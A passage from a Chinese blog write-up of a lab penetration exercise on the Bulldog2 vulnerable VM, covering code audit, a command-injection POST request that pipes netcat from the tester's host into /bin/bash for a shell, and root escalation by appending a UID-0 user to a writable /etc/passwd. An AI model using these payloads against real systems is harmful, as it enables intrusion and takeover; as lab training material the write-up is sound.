+<h2 id="进一步信息收集"><a href="#进一步信息收集" class="headerlink" title="进一步信息收集"></a>进一步信息收集</h2><p>只开了80,那我们去80端口看下 <img src="/images/2018/09/2018-09-17-14-52-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 测试一下,发现几乎没什么功能,注册也关闭了 后来去一个用户信息页面的时候尝试注入,结果得到了错误回显 访问页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.121/profile/lrberna%df&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2018/09/2018-09-17-14-54-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 发现是nodejs,然后发现web目录中的关键词<code>Bulldog-2-The-Reckoning</code> 我们去github搜一下 然后找到原仓库<a target="_blank" rel="noopener" href="https://github.com/Frichetten/Bulldog-2-The-Reckoning" title="https://github.com/Frichetten/Bulldog-2-The-Reckoning">https://github.com/Frichetten/Bulldog-2-The-Reckoning</a> <img src="/images/2018/09/2018-09-17-14-56-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 开始代码审计</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>看web代码还是习惯先看router,方便了解网站的功能 一打开router就发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const &#123;exec&#125; = require(&#x27;child_process&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>ctrl+f搜一下,发现关键代码 <img src="/images/2018/09/2018-09-17-14-58-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 即在<code>/linkauthenticate</code>页面存在一个任意代码执行漏洞 burp抓下包,改post和路径,带上命令注入的信息,注意带上<code>Content-type: application/json</code> 我们ping一下,本机<code>tcpdump -nni wlan0 icmp</code> <img src="/images/2018/09/2018-09-17-15-08-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 得到回显,本来这里应该直接反弹shell的,但是不知道为什么反弹不了,猜测是字符的问题,所以换了个方式,我们payload里面让nc获得的信息用管道符转到bash,然后在nc里面让它执行反弹shell的命令,最后我们的数据包如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users/linkauthenticate</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.121</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/json;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;465-1649e73083e&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Sun, 15 Jul 2018 14:58:16 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>77</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"> <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;;nc 192.168.43.245 6712  /bin/bash&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>然后拿到shell <img src="/images/2018/09/2018-09-17-15-14-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
+<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>没有用户的密码,但是我们可以看下本机有没有什么配置问题导致可以提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ ls -l /etc  grep passwd</span><br><span class="line">ls -l /etc  grep passwd</span><br><span class="line">-rwxrwxrwx 1 root root       1728 Sep 17 04:46 passwd</span><br><span class="line">-rw-r--r-- 1 root root       1650 Jul 15 04:06 passwd-</span><br></pre></td></tr></table></figure>
+
+<p>发现passwd是可写的,那么我们直接写入一个新的用户就可以了 用openssl生成密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ode@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ openssl passwd -1 -salt cnss blacsheep</span><br><span class="line">s blacsheepswd -1 -salt cnss</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1$cnss<span class="variable">$LUsyAIs8qkoK</span>/EBDFmYs61</span></span><br></pre></td></tr></table></figure>
+
+<p>构造一个新的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacsheep:$1$cnss$LUsyAIs8qkoK/EBDFmYs61:0:0:,,,:/home/node:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后echo到passwd里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;blacsheep:\$1\$cnss\$LUsyAIs8qkoK/EBDFmYs61:0:0:,,,:/home/node:/bin/bash&quot;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>注意这里的\$转义一下 然后就拿到root了 <img src="/images/2018/09/2018-09-17-15-29-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wakanda-1"><span class="toc-number">1.</span> <span class="toc-text">wakanda:1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%92%8C%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">安装和介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.</span> <span class="toc-text">ip和端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BFshell"><span class="toc-number">1.3.</span> <span class="toc-text">拿shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bulldog2"><span class="toc-number">2.</span> <span class="toc-text">bulldog2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E5%92%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.1.</span> <span class="toc-text">介绍和下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E5%92%8C%E7%AB%AF%E5%8F%A3-1"><span class="toc-number">2.2.</span> <span class="toc-text">ip和端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">进一步信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.4.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">2.5.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&text=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&is_video=false&description=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机渗透学习(wakanda,bulldog2)&body=Check out this article: http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&name=靶机渗透学习(wakanda,bulldog2)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&t=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
